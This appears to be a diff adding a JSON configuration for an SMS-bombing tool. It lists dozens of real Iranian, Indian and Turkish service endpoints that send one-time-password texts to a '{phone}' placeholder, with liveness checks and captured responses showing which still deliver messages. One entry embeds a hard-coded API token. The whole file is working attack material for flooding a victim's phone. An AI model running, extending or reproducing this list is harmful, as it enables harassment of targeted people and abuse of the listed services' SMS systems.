+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://tap33.me/api/v2/user",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "credential": {
+            "phoneNumber": "{phone}",
+            "role": "BIKER"
+          }
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"result\":\"OK\"}"
+    }
+  },
+  {
+    "id": "bsl-tapsi",
+    "name": "Tapsi",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.tapsi.ir/api/v2.2/user",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "credential": {
+            "phoneNumber": "{phone}",
+            "role": "DRIVER"
+          },
+          "otpOption": "SMS"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"result\":\"OK\",\"data\":{\"countdown\":60000,\"availableOtpOptions\":[\"SMS\"]}}"
+    }
+  },
+  {
+    "id": "bsl-gapfilm",
+    "name": "GapFilm",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://core.gapfilm.ir/api/v3.1/Account/Login",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "Type": "3",
+          "Username": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"Code\":1,\"Message\":\"عملیات با موفقیت انجام شد\",\"Data\":{\"ChargingEngineSettingsId\":3,\"OriginalChargingEngineSettingsId\":3,\"OrderId\":null,\"UsedFreePackageBefore\":false,\"UsedGiftCodeBefore\":false,\"Opera"
+    }
+  },
+  {
+    "id": "bsl-itoll",
+    "name": "IToll",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://app.itoll.com/api/v1/auth/login",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "mobile": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 422,
+      "why": "http:422+request-rejected",
+      "response": "{\n    \"message\": \"Something went wrong. Please try again later.\"\n}"
+    }
+  },
+  {
+    "id": "bsl-hamrah_mechanic",
+    "name": "HamrahMechanic",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://www.hamrah-mechanic.com/api/v1/membership/otp",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "PhoneNumber": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+structured",
+      "response": "{\"code\":\"HEIMDALL_BAD_REQUEST\",\"correlationId\":\"\",\"message\":\"Bad Request \",\"details\":\"\",\"data\":{}}"
+    }
+  },
+  {
+    "id": "bsl-okcs",
+    "name": "OKCS",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://my.okcs.com/api/check-mobile",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "mobile": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "ok_empty",
+      "status": 200,
+      "why": "http:200",
+      "response": "success"
+    }
+  },
+  {
+    "id": "bsl-paklean",
+    "name": "Paklean",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://client.api.paklean.com/download",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "tel": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"msg\":\"send download link ok\",\"code\":200}"
+    }
+  },
+  {
+    "id": "bsl-khodro45",
+    "name": "Khodro45",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://khodro45.com/api/v1/customers/otp/",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "mobile": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+structured",
+      "response": "{\"mobile\":[\"مطمعن شوید طول این مقدار حداقل 11 است.\"]}"
+    }
+  },
+  {
+    "id": "bsl-digikalajet",
+    "name": "DigikalaJet",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.digikalajet.ir/user/login-register/",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "phone": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"status\":200,\"data\":{\"phone_number\":\"989991234567\",\"token\":\"QWRla1cySEcvRmV2WVB2ekIxamlDL3Nub3BCNDhyMnptMklSdDk2dHZVVzdXSTgrcE85aVVOL0RPTHU2Q0RIanJLYTNwdTM4RDUrSlFCdUFDaFJqSnc9PQ==\",\"sms_ttl\":120,\"ne"
+    }
+  },
+  {
+    "id": "bsl-miare",
+    "name": "Miare",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://www.miare.ir/api/otp/driver/request/",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "phone_number": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+structured",
+      "response": "{\"code\":\"invalid_captcha\",\"detail\":\"The captcha key is either expired or wrong. \",\"metadata\":null}"
+    }
+  },
+  {
+    "id": "bsl-namava",
+    "name": "Namava",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "UserName": "+98{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"succeeded\":false,\"result\":null,\"error\":{\"code\":10629,\"message\":\"Region Limitation\",\"details\":null}}"
+    }
+  },
+  {
+    "id": "bsl-shab",
+    "name": "Shab",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/check-mobile",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "mobile": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 405,
+      "why": "http:405+structured",
+      "response": "{\n    \"data\": null,\n    \"meta\": {\n        \"status\": 405,\n        \"messages\": [\n            \"The POST method is not supported for route api/fa/sandbox/v_1_4/auth/check-mobile. Supported methods: GET, H"
+    }
+  },
+  {
+    "id": "bsl-torob",
+    "name": "Torob",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.torob.com/v4/user/phone/send-pin",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "phone_number": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+request-rejected",
+      "response": "{\"error\": {\"message\": \"\\u0634\\u0645\\u0627\\u0631\\u0647 \\u062a\\u0644\\u0641\\u0646 \\u0648\\u0627\\u0631\\u062f \\u0634\\u062f\\u0647 \\u0645\\u0639\\u062a\\u0628\\u0631 \\u0646\\u06cc\\u0633\\u062a.\", \"error_user_title\""
+    }
+  },
+  {
+    "id": "bsl-basalam",
+    "name": "Basalam",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://auth.basalam.com/otp-request",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "mobile": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 422,
+      "why": "http:422+structured",
+      "response": "{\"http_status\":422,\"messages\":[{\"code\":1,\"message\":\"\\u0634\\u0645\\u0627\\u0631\\u0647 \\u0645\\u0648\\u0628\\u0627\\u06cc\\u0644\\u062a \\u062f\\u0631\\u0633\\u062a \\u0646\\u06cc\\u0633\\u062a.\",\"fields\":[\"mobile\"]}]}"
+    }
+  },
+  {
+    "id": "bsl-gap",
+    "name": "Gap",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://core.gap.im/v1/user/add.json",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "mobile": "+98{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+structured",
+      "response": "{\"status\":\"error\",\"code\":400,\"message\":\"Mobile number is not valid\",\"data\":[]}"
+    }
+  },
+  {
+    "id": "bsl-hamrahsport",
+    "name": "Hamrahsport",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://hamrahsport.com/send-otp",
+        "data": {
+          "cell": "{phone}",
+          "name": "Persian",
+          "agree": "1",
+          "send_otp": "1"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"sent\":true}"
+    }
+  },
+  {
+    "id": "bsl-dalfak",
+    "name": "Dalfak",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://www.dalfak.com/api/auth/sendVerificationCode",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "type": 1,
+          "value": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"msg\":\"sent\"}"
+    }
+  },
+  {
+    "id": "bsl-parkbag",
+    "name": "Parkbag",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://parkbag.com/fa/Account/RegisterOrLoginByMobileNumber",
+        "data": {
+          "ReturnUrl": "https://parkbag.com/",
+          "MobaileNumber": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"status\":-2,\"message\":\"خطا در ثبت،لطفا دوباره سعی کنید\"}"
+    }
+  },
+  {
+    "id": "bsl-sunnybook",
+    "name": "Sunnybook",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://sunnybook.ir/Home/RegisterUser",
+        "data": {
+          "name": "Mr",
+          "password": "123456",
+          "mobile": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"datas\":\"\\u003Cdiv class=\\u0027kt-register-form-errors-inner\\u0027 style=\\u0027color:red\\u0027\\u003E\\u003Cdiv\\u003E\\u0644\\u0637\\u0641\\u0627  \\u060C\\u0646\\u0627\\u0645 \\u062E\\u0627\\u0646\\u0648\\u0627\\u0"
+    }
+  },
+  {
+    "id": "bsl-mahouney",
+    "name": "Mahouney",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://mahouney.com/fa/Account/RegisterOrLoginByMobileNumber",
+        "data": {
+          "ReturnUrl": "https://mahouney.com/",
+          "MobaileNumber": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"status\":-2,\"message\":\"خطا در ثبت،لطفا دوباره سعی کنید\"}"
+    }
+  },
+  {
+    "id": "bsl-myroz",
+    "name": "Myroz",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://myroz.ir/wp-admin/admin-ajax.php",
+        "data": {
+          "action": "stm_login_register",
+          "type": "mobile",
+          "input": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"success\":true,\"text\":\"\\u06a9\\u062f \\u0641\\u0639\\u0627\\u0644\\u0633\\u0627\\u0632\\u06cc \\u0628\\u0631\\u0627\\u06cc \\u0634\\u0645\\u0627 \\u0627\\u0631\\u0633\\u0627\\u0644 \\u0634\\u062f.\",\"code\":\"1000\",\"data\":\"<f"
+    }
+  },
+  {
+    "id": "bsl-microele",
+    "name": "Microele",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://www.microele.com/login?back=my-account",
+        "data": {
+          "id_customer": "",
+          "back": "my-account",
+          "firstname": "123",
+          "lastname": "123",
+          "password": "123456",
+          "action": "register",
+          "username": "{phone}",
+          "ajax": "1"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "ok_empty",
+      "status": 200,
+      "why": "http:200",
+      "response": ""
+    }
+  },
+  {
+    "id": "bsl-noavarpub",
+    "name": "Noavarpub",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://novinparse.com/Page/PageAction.aspx",
+        "data": {
+          "Action": "SendVerifyCode",
+          "mobile": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "ok_empty",
+      "status": 200,
+      "why": "http:200",
+      "response": "err simbol"
+    }
+  },
+  {
+    "id": "bsl-vinaaccessory",
+    "name": "Vinaaccessory",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://vinaaccessory.com/api/v1/sessions/login_request",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "mobile_phone": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "ok_empty",
+      "status": 200,
+      "why": "http:200",
+      "response": ""
+    }
+  },
+  {
+    "id": "bsl-chortkehshop",
+    "name": "Chortkehshop",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://chortkehshop.ir/api/v1/sessions/login_request",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "mobile_phone": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+request-rejected",
+      "response": "{\"errors\":{\"message\":\"کاربری با این  شماره موبایل یافت نشد، لطفا ایمیل خود را وارد کنید\"}}"
+    }
+  },
+  {
+    "id": "bsl-dreamlandshop",
+    "name": "Dreamlandshop",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://dreamlandshop.ir/api/v1/sessions/login_request",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "mobile_phone": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+request-rejected",
+      "response": "{\"errors\":{\"message\":\"کاربری با این  شماره موبایل یافت نشد، لطفا ایمیل خود را وارد کنید\"}}"
+    }
+  },
+  {
+    "id": "bsl-confirmtkt",
+    "name": "Confirmtkt",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      91
+    ],
+    "requests": [
+      {
+        "method": "GET",
+        "url": "https://securedapi.confirmtkt.com/api/platform/register",
+        "params": {
+          "newOtp": "true",
+          "mobileNumber": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "ok_empty",
+      "status": 200,
+      "why": "http:200",
+      "response": "false"
+    }
+  },
+  {
+    "id": "bsl-housing",
+    "name": "Housing",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      91
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://login.housing.com/api/v2/send-otp",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "phone": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"message\":\"OTP Sent\",\"response_code\":1}"
+    }
+  },
+  {
+    "id": "bsl-treebo",
+    "name": "Treebo",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      91
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://www.treebo.com/api/v2/auth/login/otp/",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "phone_number": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"status\":200,\"data\":{\"message\":\"OTP sent successfully.\",\"otp_request_attempts\":1,\"max_otp_request_attempts\":6},\"request_data\":{}}"
+    }
+  },
+  {
+    "id": "bsl-pharmeasy",
+    "name": "Pharmeasy",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      91
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://pharmeasy.in/api/auth/requestOTP",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "contactNumber": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"status\":1,\"data\":{\"resendSmsCounter\":\"30\",\"missedCallNumber\":\"02261816370\",\"numberOfDigits\":4}}"
+    }
+  },
+  {
+    "id": "bsl-cashify",
+    "name": "Cashify",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      91
+    ],
+    "requests": [
+      {
+        "method": "GET",
+        "url": "https://www.cashify.in/api/cu01/v1/app-link",
+        "params": {
+          "mn": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"priceBreakupDtos\":null,\"r_id\":\"16269471-f244-4883-a703-90dddc869d98\",\"s\":0,\"m\":\"Message can't be sent\",\"pbp\":null,\"mk\":null}"
+    }
+  },
+  {
+    "id": "bsl-mobikwik",
+    "name": "Mobikwik",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      91
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://webapi.mobikwik.com/p/account/otp/cell/v2",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-MClient": "0"
+        },
+        "json": {
+          "cell": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"success\":true,\"data\":{\"generalMessage\":\"OTP is sent successfully to your primary number ending in *******567\"}}"
+    }
+  },
+  {
+    "id": "bsl-redbus",
+    "name": "Redbus",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      91
+    ],
+    "requests": [
+      {
+        "method": "GET",
+        "url": "https://m.redbus.in/api/getOtp",
+        "params": {
+          "number": "{phone}",
+          "cc": "91",
+          "whatsAppOpted": "false"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"Code\":\"200\",\n\"Message\":\"OTP Sent Successfully\"}"
+    }
+  },
+  {
+    "id": "bsl-newtonschools",
+    "name": "NewtonSchools",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      91
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://my.newtonschool.co:443/api/v1/user/otp/",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "phone": "+91{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+structured",
+      "response": "{\"error_code\":\"E261\",\"message\":\"google recaptcha response not provided\"}"
+    }
+  },
+  {
+    "id": "bsl-realestateindia",
+    "name": "RealEstateIndia",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      91
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php",
+        "data": {
+          "action_id": "call_to_otp",
+          "mob_num": "{phone}",
+          "member_id": "1547045"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "ok_empty",
+      "status": 200,
+      "why": "http:200",
+      "response": "\n N"
+    }
+  },
+  {
+    "id": "bsl-cultfit",
+    "name": "CultFit",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      91
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://www.cult.fit/api/auth/loginPhoneSendOtp",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "phone": "{phone}",
+          "countryCallingCode": "+91",
+          "captchaResponse": null
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"success\":true}"
+    }
+  },
+  {
+    "id": "bsl-udaan",
+    "name": "Udaan",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      91
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://auth.udaan.com/api/otp/send",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "params": {
+          "client_id": "udaan-v2"
+        },
+        "json": {
+          "mobile": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 415,
+      "why": "http:415+structured",
+      "response": "{\"code\":415,\"message\":\"HTTP 415 Unsupported Media Type\"}"
+    }
+  },
+  {
+    "id": "bsl-payrup",
+    "name": "Payrup",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      91
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.payrup.com/api/auth/otp/generate",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "mobileNumber": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"status\":false,\"message\":\"No Header Present\",\"messageCode\":\"\",\"result\":{}}"
+    }
+  },
+  {
+    "id": "bsl-healthkart",
+    "name": "HealthKart",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      91
+    ],
+    "requests": [
+      {
+        "method": "GET",
+        "url": "https://www.healthkart.com/veronica/user/validate/1/{phone}/signup"
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"results\":{\"exception\":false,\"msgs\":[\"Sms sent to User\"],\"uid\":null,\"uType\":\"signup\",\"guestAlreadyExist\":false,\"stId\":1,\"unverifiedGuestExist\":false,\"userExist\":false},\"statusCode\":200}"
+    }
+  },
+  {
+    "id": "bsl-medibuddy",
+    "name": "Medibuddy",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      91
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://loginprod.medibuddy.in/unified-login/user/register",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "source": "medibuddyInWeb",
+          "platform": "medibuddy",
+          "phonenumber": "{phone}",
+          "flow": "Retail-Login-Home-Flow"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"success\":1,\"data\":{\"otpDataId\":4675,\"OtpStatus\":\"OTP Sent\",\"AttemptsToRecieve\":1}}"
+    }
+  },
+  {
+    "id": "bsl-ayyildiz",
+    "name": "Ayyildiz",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      90
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.altinyildizclassics.com/mobileapi2/autapi/CreateSmsOtpForRegister",
+        "headers": {
+          "Token": "MXZ5NTJ82WXBUJB7KBP10AGR3AF6S4GB95VZDU4G44JFEIN3WISAC2KLRIBNONQ7QVCZXM3ZHI661AMVXLKJLF9HUKI5SQ2ROMZS",
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "data": {
+          "gsm": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"Success\":true,\"Message\":null,\"invitationMessage\":null,\"Result\":{\"IsSuccessful\":false,\"ErrorMessage\":\"Yeni Sürüm Gerekli\",\"Gsm\":null,\"ReferenceCode\":null,\"ValidateSeconds\":0,\"Redirect\":false},\"Except"
+    }
+  },
+  {
+    "id": "bsl-bisu",
+    "name": "Bisu",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      90
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://www.bisu.com.tr/api/v2/app/authentication/phone/register",
+        "headers": {
+          "X-Device-Platform": "IOS",
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "data": {
+          "phoneNumber": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 530,
+      "why": "http:530+structured",
+      "response": "{\"type\":\"https://developers.cloudflare.com/support/troubleshooting/http-status-codes/cloudflare-1xxx-errors/error-1016/\",\"title\":\"Error 1016: Origin DNS error\",\"status\":530,\"detail\":\"Cloudflare is una"
+    }
+  },
+  {
+    "id": "bsl-beefull",
+    "name": "Beefull",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      90
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://app.beefull.io/api/inavitas-access-management/sms-login",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "phoneCode": "90",
+          "phoneNumber": "{phone}",
+          "tenant": "beefull"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 503,
+      "why": "http:503+structured",
+      "response": "{\"statusCode\":503,\"error\":true,\"name\":\"RemoteAPIServerError\",\"message\":\"User not found!\"}"
+    }
+  }
+]
